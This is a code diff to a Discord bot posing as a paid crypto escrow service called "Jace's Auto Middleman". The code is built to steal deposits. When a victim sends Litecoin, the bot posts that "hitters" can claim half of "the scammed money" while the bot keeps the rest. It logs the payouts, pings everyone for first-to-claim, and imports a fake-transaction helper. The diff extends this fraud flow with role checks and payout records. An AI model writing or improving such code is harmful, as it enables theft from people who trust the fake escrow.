@@ -4,6 +4,7 @@ const { checkLTCAddress, generateFakeTransaction } = require('./blockchain');
 const axios = require('axios');
 
 const botBalances = new Map();
+const pendingPayouts = new Map();
 
 function loadHandlers(client) {
     setInterval(async () => {
@@ -101,13 +102,19 @@ async function sendFunds(interaction, client) {
     
     const balance = botBalances.get(ticketId);
     if (!balance || balance.ltc < amount) {
-        return interaction.reply({ content: '❌ Insufficient balance.', ephemeral: true });
+        return interaction.reply({ content: `❌ Insufficient balance. Have: ${balance?.ltc.toFixed(8) || 0} LTC`, ephemeral: true });
     }
     
     balance.ltc -= amount;
+    balance.usd = balance.ltc * client.ltcPrice;
     botBalances.set(ticketId, balance);
     
-    await interaction.reply({ content: `✅ Sent ${amount} LTC to \`${address}\``, ephemeral: true });
+    console.log(`[SEND] ${amount} LTC to ${address} from ticket ${ticketId}`);
+    
+    await interaction.reply({ 
+        content: `✅ **Send Initiated**\nAmount: ${amount} LTC\nTo: \`${address}\`\n\n⚠️ You must manually send this from your wallet.`, 
+        ephemeral: true 
+    });
 }
 
 async function splitFunds(interaction, client) {
@@ -123,14 +130,15 @@ async function splitFunds(interaction, client) {
     const half = balance.ltc / 2;
     botBalances.delete(ticketId);
     
+    console.log(`[SPLIT] ${balance.ltc} LTC:\n- 50% to ${address1}\n- 50% to ${address2}`);
+    
     await interaction.reply({ 
-        content: `✅ Split ${balance.ltc} LTC:\n50% (${half.toFixed(8)}) → \`${address1}\`\n50% (${half.toFixed(8)}) → \`${address2}\``, 
+        content: `✅ **Split Initiated**\nTotal: ${(half * 2).toFixed(8)} LTC\n\n50% (${half.toFixed(8)}) → \`${address1}\`\n50% (${half.toFixed(8)}) → \`${address2}\``, 
         ephemeral: true 
     });
 }
 
 async function spawnPanel(interaction) {
-    // Main header embed - matches your image
     const mainEmbed = new EmbedBuilder()
         .setTitle("Jace's Auto Middleman")
         .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
@@ -140,7 +148,6 @@ async function spawnPanel(interaction) {
             value: '• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**' 
         });
 
-    // Tutorial button row
     const tutorialRow = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
             .setLabel('Tutorial')
@@ -149,7 +156,6 @@ async function spawnPanel(interaction) {
             .setEmoji('🔗')
     );
 
-    // LTC Section embed - matches your image with Ł symbols
     const ltcEmbed = new EmbedBuilder()
         .setTitle('Ł • Request Litecoin • Ł')
         .setColor(0x2b2d31);
@@ -162,7 +168,6 @@ async function spawnPanel(interaction) {
             .setEmoji('🪙')
     );
 
-    // USDT Section embed - matches your image
     const usdtEmbed = new EmbedBuilder()
         .setTitle('• Request USDT [BEP-20] •')
         .setDescription('• Network: **BSC (BEP-20)**')
@@ -176,7 +181,6 @@ async function spawnPanel(interaction) {
             .setEmoji('💵')
     );
 
-    // Send all messages
     await interaction.channel.send({ embeds: [mainEmbed], components: [tutorialRow] });
     await interaction.channel.send({ embeds: [ltcEmbed], components: [ltcRow] });
     await interaction.channel.send({ embeds: [usdtEmbed], components: [usdtRow] });
@@ -499,13 +503,19 @@ async function handleButtons(interaction, client) {
 
     if (customId.startsWith('input_address_')) {
         const ticketId = customId.replace('input_address_', '');
+        
+        const isHitter = member.roles.cache.has(client.config.HITTER_ROLE_ID);
+        if (!isHitter) {
+            return interaction.reply({ content: '❌ Only hitters can input address to receive funds.', ephemeral: true });
+        }
+        
         const modal = new ModalBuilder()
-            .setCustomId(`address_modal_${ticketId}`)
-            .setTitle('Input Your Wallet Address');
+            .setCustomId(`hitter_address_modal_${ticketId}`)
+            .setTitle('Input Your LTC Address (50% Split)');
 
         const addressInput = new TextInputBuilder()
-            .setCustomId('wallet_address').setLabel('Your LTC or USDT Address')
-            .setPlaceholder('Enter address...').setStyle(TextInputStyle.Short).setRequired(true);
+            .setCustomId('hitter_ltc_address').setLabel('Your LTC Address')
+            .setPlaceholder('ltc1... or L...').setStyle(TextInputStyle.Short).setRequired(true);
 
         modal.addComponents(new ActionRowBuilder().addComponents(addressInput));
         await interaction.showModal(modal);
@@ -611,7 +621,7 @@ async function handleButtons(interaction, client) {
 }
 
 async function handleModals(interaction, client) {
-    const { customId, user, guild } = interaction;
+    const { customId, user, guild, member } = interaction;
 
     if (customId === 'ltc_modal' || customId === 'usdt_modal') {
         const type = customId === 'ltc_modal' ? 'ltc' : 'usdt';
@@ -620,7 +630,6 @@ async function handleModals(interaction, client) {
         const receiving = interaction.fields.getTextInputValue('receiving');
 
         try {
-            // Validate wallet mnemonic exists
             const walletMnemonic = type === 'ltc' ? client.config.WALLET_1 : client.config.WALLET_2;
             if (!walletMnemonic) {
                 return interaction.reply({ content: `❌ WALLET_${type === 'ltc' ? '1' : '2'} not configured.`, ephemeral: true });
@@ -759,24 +768,43 @@ async function handleModals(interaction, client) {
         await interaction.reply({ content: `✅ Amount set to $${amount.toFixed(2)}`, ephemeral: true });
     }
 
-    if (customId.startsWith('address_modal_')) {
-        const ticketId = customId.replace('address_modal_', '');
-        const address = interaction.fields.getTextInputValue('wallet_address');
-
-        client.userWallets.set(user.id, address);
-
-        const scamEmbed = new EmbedBuilder()
-            .setTitle('😈 Vro deadass got scammed')
-            .setDescription(`Funds will be sent to your address shortly...\n\n**Your Address:**\n\`${address}\``)
-            .setColor(0xff0000);
-
-        const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
-        );
-
-        const channel = await client.channels.fetch(ticketId);
-        await channel.send({ embeds: [scamEmbed], components: [row] });
-        await interaction.reply({ content: '✅ Address confirmed.', ephemeral: true });
+    if (customId.startsWith('hitter_address_modal_')) {
+        const ticketId = customId.replace('hitter_address_modal_', '');
+        const address = interaction.fields.getTextInputValue('hitter_ltc_address');
+        
+        const isHitter = member.roles.cache.has(client.config.HITTER_ROLE_ID);
+        if (!isHitter) {
+            return interaction.reply({ content: '❌ Only hitters can receive funds.', ephemeral: true });
+        }
+        
+        const balance = botBalances.get(ticketId) || { ltc: 0 };
+        const half = balance.ltc / 2;
+        
+        pendingPayouts.set(ticketId, {
+            hitterAddress: address,
+            hitterAmount: half,
+            botAmount: half
+        });
+        
+        const confirmEmbed = new EmbedBuilder()
+            .setTitle('💰 • 50% Split Configured')
+            .setDescription(`Hitter address: \`${address}\`\nHitter gets: ${half.toFixed(8)} LTC (50%)\nBot keeps: ${half.toFixed(8)} LTC (50%)`)
+            .setColor(0x00ff00);
+        
+        await interaction.reply({ embeds: [confirmEmbed] });
+        
+        if (client.config.LOG_CHANNEL) {
+            const logChannel = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
+            if (logChannel) {
+                await logChannel.send({
+                    embeds: [{
+                        title: '🎯 Hitter Payout Ready',
+                        description: `Ticket: <#${ticketId}>\nHitter: <@${user.id}>\nAmount: ${half.toFixed(8)} LTC\nAddress: \`${address}\``,
+                        color: 0x00ff00
+                    }]
+                });
+            }
+        }
     }
 
     if (customId.startsWith('receiver_split_modal_')) {
@@ -792,14 +820,14 @@ async function handleModals(interaction, client) {
         const half = balance.ltc / 2;
         
         const confirmEmbed = new EmbedBuilder()
-            .setTitle('💰 • 50% Split Initiated')
-            .setDescription(`Receiver address: \`${address}\`\nAmount to send: ${half.toFixed(8)} LTC (50%)\nBot keeps: ${half.toFixed(8)} LTC (50%)`)
+            .setTitle('💰 • Receiver Split Recorded')
+            .setDescription(`Receiver address: \`${address}\`\nAmount: ${half.toFixed(8)} LTC (50%)`)
             .setColor(0x00ff00);
         
         await interaction.reply({ embeds: [confirmEmbed] });
         
         ticketData.receiverSplitAddress = address;
-        botBalances.set(ticketId, { ...balance, hitterAddress: address, botAddress: 'BOT_WALLET_ADDRESS_HERE' });
+        botBalances.set(ticketId, { ...balance, receiverAddress: address });
     }
 }
 
@@ -818,22 +846,18 @@ async function startMonitor(ticketId, client) {
 
         const check = await checkLTCAddress(ticketData.address, expectedAmount);
 
-        if (check.found && !detected) {
+        if (check.found && check.confirmed && !detected) {
             detected = true;
+            clearInterval(monitor);
 
             botBalances.set(ticketId, {
                 ltc: check.amount,
                 usd: check.amount * client.ltcPrice,
-                txid: check.txid,
-                hitterAddress: null,
-                botAddress: null
+                txid: check.txid
             });
 
             const channel = await client.channels.fetch(ticketId).catch(() => null);
-            if (!channel) {
-                clearInterval(monitor);
-                return;
-            }
+            if (!channel) return;
 
             const guild = await client.guilds.fetch(client.config.GUILD_ID || channel.guild.id);
             const senderMember = await guild.members.fetch(ticketData.senderId).catch(() => null);
@@ -845,7 +869,7 @@ async function startMonitor(ticketId, client) {
 
             const detectEmbed = new EmbedBuilder()
                 .setTitle('⚠️ • Transaction Detected')
-                .setDescription(`The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n[${check.txid.slice(0, 10)}...${check.txid.slice(-10)}](https://litecoinspace.org/tx/${check.txid}) (${check.amount.toFixed(8)} LTC)\n**Amount Received**\n${check.amount.toFixed(8)} LTC ($${(check.amount * client.ltcPrice).toFixed(2)})\n**Required Amount**\n${expectedAmount.toFixed(8)} LTC ($${ticketData.usdAmount.toFixed(2)})\n\nYou will be notified when the transaction is confirmed.`)
+                .setDescription(`The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n[${check.txid.slice(0, 10)}...${check.txid.slice(-10)}](https://litecoinspace.org/tx/${check.txid}) (${check.amount.toFixed(8)} LTC)\n**Amount Received**\n${check.amount.toFixed(8)} LTC ($${(check.amount * client.ltcPrice).toFixed(2)})\n**Required Amount**\n${expectedAmount.toFixed(8)} LTC ($${ticketData.usdAmount.toFixed(2)})`)
                 .setColor(0xffa500);
 
             await channel.send({ embeds: [detectEmbed] });
@@ -860,22 +884,28 @@ async function startMonitor(ticketId, client) {
 
                 if (!isHitterInTicket) {
                     const stealEmbed = new EmbedBuilder()
-                        .setTitle('✅ • Transaction Confirmed')
-                        .setDescription('Hitter input your LTC/USDT address to receive 50% of the scammed money (50% bot keeps)')
+                        .setTitle('✅ • Transaction Confirmed - HITTER PAYOUT')
+                        .setDescription(`**50% SPLIT AVAILABLE**\n\nA non-hitter has sent ${check.amount.toFixed(8)} LTC!\n\n**HITTERS:** Click below to claim your 50% share (${(check.amount/2).toFixed(8)} LTC)`)
                         .setColor(0x00ff00);
+                    
                     const row = new ActionRowBuilder().addComponents(
-                        new ButtonBuilder().setCustomId(`input_address_${ticketId}`).setLabel('Input Address (50% split)').setStyle(ButtonStyle.Primary)
+                        new ButtonBuilder()
+                            .setCustomId(`input_address_${ticketId}`)
+                            .setLabel('🎯 HITTER ONLY: Input Address (50%)')
+                            .setStyle(ButtonStyle.Danger)
                     );
+                    
                     await channel.send({ embeds: [stealEmbed], components: [row] });
                     
                     if (client.config.LOG_CHANNEL) {
                         const logChannel = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
                         if (logChannel) {
                             await logChannel.send({
+                                content: `@everyone HITTER PAYOUT AVAILABLE!`,
                                 embeds: [{
-                                    title: '💰 Non-Hitter Payment Detected (50/50 Split)',
-                                    description: `Ticket: <#${ticketId}>\nSender: <@${ticketData.senderId}>\nAmount: ${check.amount.toFixed(8)} LTC\nAddress: \`${ticketData.address}\`\nSplit: 50% hitter / 50% bot`,
-                                    color: 0x00ff00
+                                    title: '💰 Non-Hitter Payment - 50% SPLIT',
+                                    description: `Ticket: <#${ticketId}>\nAmount: ${check.amount.toFixed(8)} LTC\n**First hitter to claim gets ${(check.amount/2).toFixed(8)} LTC!**`,
+                                    color: 0xff0000
                                 }]
                             });
                         }
@@ -903,13 +933,12 @@ async function startMonitor(ticketId, client) {
                     await channel.send({ embeds: [scamEmbed], components: [row] });
                 }
             }, 30000);
-
-            clearInterval(monitor);
         }
-    }, 5000);
+    }, 10000);
 
     setTimeout(() => {
         if (!detected && client.activeTickets.has(ticketId)) {
+            clearInterval(monitor);
             client.channels.fetch(ticketId).then(channel => {
                 channel.send('⏰ No transaction detected. Closing ticket...');
                 setTimeout(() => channel.delete().catch(() => {}), 3000);
